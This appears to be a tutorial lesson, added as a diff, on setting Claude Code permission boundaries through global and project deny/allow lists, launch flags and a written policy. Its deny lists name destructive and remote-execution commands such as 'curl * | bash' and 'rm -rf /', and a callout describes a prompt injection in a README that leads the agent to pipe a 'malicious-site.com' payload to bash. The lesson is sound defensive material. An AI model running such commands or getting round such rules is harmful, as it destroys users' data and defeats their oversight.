@@ -1,0 +1,270 @@
+---
+title: "Set permission boundaries for Claude Code"
+lessonNumber: "11.3.2"
+chapterNumber: "11.3"
+pathNumber: "11"
+tutorPreload: "Help me configure Claude Code so it cannot run destructive commands or access files outside my project."
+verifyType: "terminal_output"
+---
+
+# Set permission boundaries for Claude Code
+
+## Objective
+
+By the end of this lesson you will configure Claude Code's permission system to restrict which tools it can use, which commands it can run, and which directories it can access. You will edit the settings file, verify the restrictions work, and understand the layered permission model.
+
+## Walkthrough
+
+### Step 1 — Understand the permission layers
+
+Claude Code's permissions work in three layers, from broadest to narrowest:
+
+| Layer | File | Scope | Who controls it |
+|---|---|---|---|
+| **Global settings** | `~/.claude/settings.json` | All projects on your machine | You |
+| **Project settings** | `.claude/settings.json` in your repo root | This project only | Team (committed to git) |
+| **Session flags** | `--allowedTools` on the command line | This session only | You, at launch time |
+
+A tool must be allowed at every layer to work. If global settings block `bash(rm)`, no project or session can override that.
+
+### Step 2 — Find or create your global settings file
+
+**macOS / Linux**
+
+```bash
+mkdir -p ~/.claude
+cat ~/.claude/settings.json 2>/dev/null || echo "{}" > ~/.claude/settings.json
+cat ~/.claude/settings.json
+```
+
+**Windows PowerShell**
+
+```powershell
+New-Item -ItemType Directory -Force -Path "$HOME\.claude"
+if (Test-Path "$HOME\.claude\settings.json") {
+    Get-Content "$HOME\.claude\settings.json"
+} else {
+    '{}' | Out-File -Encoding utf8 "$HOME\.claude\settings.json"
+    Get-Content "$HOME\.claude\settings.json"
+}
+```
+
+### Step 3 — Add command restrictions to global settings
+
+Edit the settings file to block dangerous shell patterns globally. These restrictions apply to every project.
+
+**macOS / Linux**
+
+```bash
+cat > ~/.claude/settings.json << 'EOF'
+{
+  "permissions": {
+    "deny": [
+      "bash(rm -rf /)",
+      "bash(rm -rf ~)",
+      "bash(chmod 777)",
+      "bash(curl * | bash)",
+      "bash(wget * | bash)",
+      "bash(eval *)",
+      "bash(dd if=*)"
+    ]
+  }
+}
+EOF
+cat ~/.claude/settings.json
+```
+
+**Windows PowerShell**
+
+```powershell
+@"
+{
+  "permissions": {
+    "deny": [
+      "bash(rm -rf /)",
+      "bash(rm -rf ~)",
+      "bash(chmod 777)",
+      "bash(curl * | bash)",
+      "bash(wget * | bash)",
+      "bash(eval *)",
+      "bash(dd if=*)"
+    ]
+  }
+}
+"@ | Out-File -Encoding utf8 "$HOME\.claude\settings.json"
+Get-Content "$HOME\.claude\settings.json"
+```
+
+The `*` is a wildcard — `bash(curl * | bash)` blocks any command matching that pattern.
+
+> **Real danger:** Without command restrictions, Claude Code can run any shell command your user account has access to. A prompt injection in a README or documentation file could trick Claude into executing `curl malicious-site.com/payload | bash`. Deny-listing dangerous patterns is a critical safety layer.
+
+### Step 4 — Add project-level restrictions
+
+Create a project-level settings file that allows only the tools this project needs.
+
+**macOS / Linux**
+
+```bash
+cd ~/my-project  # or any project directory
+mkdir -p .claude
+cat > .claude/settings.json << 'EOF'
+{
+  "permissions": {
+    "allow": [
+      "Read",
+      "Write",
+      "bash(python *)",
+      "bash(pip install *)",
+      "bash(git *)",
+      "bash(docker run --rm *)",
+      "bash(ls *)",
+      "bash(cat *)",
+      "bash(mkdir *)"
+    ],
+    "deny": [
+      "bash(rm -rf *)",
+      "bash(sudo *)",
+      "bash(chmod *)",
+      "bash(curl * | *)",
+      "bash(npm run build *)"
+    ]
+  }
+}
+EOF
+cat .claude/settings.json
+```
+
+**Windows PowerShell**
+
+```powershell
+Set-Location "$HOME\my-project"  # or any project directory
+New-Item -ItemType Directory -Force -Path ".claude"
+@"
+{
+  "permissions": {
+    "allow": [
+      "Read",
+      "Write",
+      "bash(python *)",
+      "bash(pip install *)",
+      "bash(git *)",
+      "bash(docker run --rm *)",
+      "bash(ls *)",
+      "bash(cat *)",
+      "bash(mkdir *)"
+    ],
+    "deny": [
+      "bash(rm -rf *)",
+      "bash(sudo *)",
+      "bash(chmod *)",
+      "bash(curl * | *)",
+      "bash(npm run build *)"
+    ]
+  }
+}
+"@ | Out-File -Encoding utf8 ".claude\settings.json"
+Get-Content ".claude\settings.json"
+```
+
+### Step 5 — Restrict Claude to a specific directory scope
+
+Use the `--allowedTools` flag at launch time to limit what Claude can access in a session.
+
+**macOS / Linux**
+
+```bash
+# Launch Claude Code restricted to only reading and writing files:
+claude --allowedTools "Read,Write,bash(python *)" --print "What tools can you use right now?"
+```
+
+**Windows PowerShell**
+
+```powershell
+# Launch Claude Code restricted to only reading and writing files:
+claude --allowedTools "Read,Write,bash(python *)" --print "What tools can you use right now?"
+```
+
+Claude will report that it can only read files, write files, and run Python commands. It cannot use bash for anything else.
+
+### Step 6 — Verify the restrictions work
+
+Test that a blocked command is actually denied. In your Claude Code session, try asking:
+
+```
+Run: rm -rf ~/important-project
+```
+
+Claude should refuse because `bash(rm -rf *)` is in the deny list. If you are using the project-level settings from Step 4, Claude will also refuse `sudo` commands and piped `curl` commands.
+
+### Step 7 — Document your permission policy
+
+Save your permission decisions in a file your team can review.
+
+**macOS / Linux**
+
+```bash
+cat > .claude/PERMISSIONS.md << 'EOF'
+# Claude Code Permission Policy
+
+## Allowed operations
+- Read and write files in this project directory
+- Run Python scripts and pip install
+- Git operations (add, commit, push, log, diff)
+- Docker run with --rm flag only
+
+## Denied operations
+- Recursive delete (rm -rf)
+- Privilege escalation (sudo)
+- Piped remote execution (curl | bash, wget | bash)
+- File permission changes (chmod)
+- System device access (dd)
+
+## Rationale
+These restrictions prevent accidental data loss and block common
+prompt injection attack patterns while allowing normal development work.
+EOF
+cat .claude/PERMISSIONS.md
+```
+
+**Windows PowerShell**
+
+```powershell
+@"
+# Claude Code Permission Policy
+
+## Allowed operations
+- Read and write files in this project directory
+- Run Python scripts and pip install
+- Git operations (add, commit, push, log, diff)
+- Docker run with --rm flag only
+
+## Denied operations
+- Recursive delete (rm -rf)
+- Privilege escalation (sudo)
+- Piped remote execution (curl | bash, wget | bash)
+- File permission changes (chmod)
+- System device access (dd)
+
+## Rationale
+These restrictions prevent accidental data loss and block common
+prompt injection attack patterns while allowing normal development work.
+"@ | Out-File -Encoding utf8 ".claude\PERMISSIONS.md"
+Get-Content ".claude\PERMISSIONS.md"
+```
+
+### What can go wrong
+
+| Symptom | Cause | Fix |
+|---|---|---|
+| Claude still runs a denied command | The deny pattern does not match the exact command Claude is using | Check the exact command in Claude's output and tighten the pattern — `bash(rm *)` is broader than `bash(rm -rf *)` |
+| Claude cannot run any commands at all | The `allow` list is too restrictive or missing | Add the specific tool patterns you need to the `allow` list |
+| Settings file is ignored | JSON syntax error in the settings file | Validate with `python3 -m json.tool ~/.claude/settings.json` or an online JSON validator |
+| `--allowedTools` flag not recognized | Older version of Claude Code | Update Claude Code: `claude update` or reinstall from the official source |
+| Team member overrides your project restrictions | They edited `.claude/settings.json` locally | Commit the project settings to git and use code review to catch unauthorized changes |
+| Claude finds a way around the deny list | Pattern matching is not a security boundary | Deny lists reduce risk but are not foolproof — always review Claude's proposed commands before approving |
+
+<VerificationBlock
+  deliverable="A global settings.json blocking dangerous commands, a project-level settings.json with allow/deny lists, and a PERMISSIONS.md documenting the policy."
+  verifyCheck="The global settings file blocks rm -rf and curl-pipe-bash patterns, the project settings file has an explicit allow list, and Claude refuses to run a denied command."
+/>
